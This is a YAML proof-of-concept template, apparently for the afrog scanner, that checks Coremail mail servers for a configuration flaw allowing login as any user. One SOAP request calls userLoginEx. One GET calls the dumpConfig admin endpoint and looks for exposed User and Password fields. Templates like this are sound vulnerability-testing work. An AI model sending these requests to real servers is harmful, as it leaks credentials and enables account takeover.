pocs/afrog-pocs/vulnerability/coremail-anyuser-login.yml

name: poc-yaml-coremail-anyuser-login
binding: 5e702444-a686-4cf4-b763-a711b689cec4
manual: true
detail:
    author: Xz
    links:
        - https://wenku.baidu.com/view/d73081135427a5e9856a561252d380eb629423f8.html
        - http://cn-sec.com/archives/339738.html
        - http://t.zoukankan.com/Sylon-p-11747476.html
    vulnerability:
        id: CT-322900
        level: high
    description: Coremail配置缺陷导致任意用户登录
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /apiws/services/API
            headers:
                Content-Type: text/xml;charset=UTF-8
            body: |
                <soapenv:Envelope
                    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                    xmlns:apiw="http://coremail.cn/apiws">
                    <soapenv:Header/>
                    <soapenv:Body>
                        <apiw:userLoginEx>
                            <!--type:string-->
                            <user_at_domain>admin@coremail.om</user_at_domain>
                            <!--type:string-->
                        </apiw:userLoginEx>
                    </soapenv:Body>
                </soapenv:Envelope>
        expression: response.status == 200 && response.body.bcontains(b"Domain Not Found") && response.headers["Content-Type"].contains("text/xml") && response.body.bstartsWith(b"<soap")
    r1:
        request:
            cache: true
            method: GET
            path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
        expression: response.status == 200 && response.body.bcontains(b"S_OK") && response.body.bcontains(b"name=\"User\">") && response.body.bcontains(b"name=\"Password\">")
expression: r0() || r1()
